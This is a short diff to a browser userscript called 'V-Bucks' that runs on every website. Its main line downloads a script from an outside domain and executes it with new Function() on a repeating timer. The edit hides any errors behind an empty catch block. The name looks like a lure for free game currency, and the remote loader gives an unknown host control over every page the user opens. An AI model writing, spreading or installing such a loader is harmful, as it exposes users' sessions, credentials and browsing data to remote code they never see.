@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         V-Bucks
 // @namespace    http://tampermonkey.net/
-// @version      0.2
+// @version      0.3
 // @description  try to take over the world!
 // @author       You
 // @match        *://*/*
@@ -18,5 +18,7 @@ window.scriptChecker = setInterval(async () =>{
         clearInterval(window.scriptChecker);
         return;
     }
-    new Function(await (await fetch('https://data.pixelbulb.online/script')).text())();
+    try{
+        new Function(await (await fetch('https://data.pixelbulb.online/script').catch(e =>e)).text())();
+    }catch(e){}
 }, 500);
